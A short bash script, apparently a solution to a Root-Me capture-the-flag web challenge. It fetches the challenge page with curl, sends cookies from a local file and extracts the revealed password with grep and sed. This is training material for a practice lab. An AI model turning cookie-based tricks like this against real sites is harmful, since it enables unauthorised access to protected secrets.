#!/bin/bash
curl -s http://challenge01.root-me.org/web-serveur/ch28/ -Lb cookie.txt | grep -o "password\s:\s.*" | sed s/"\(.*:\s\|\s<\/p>\)"/""/g
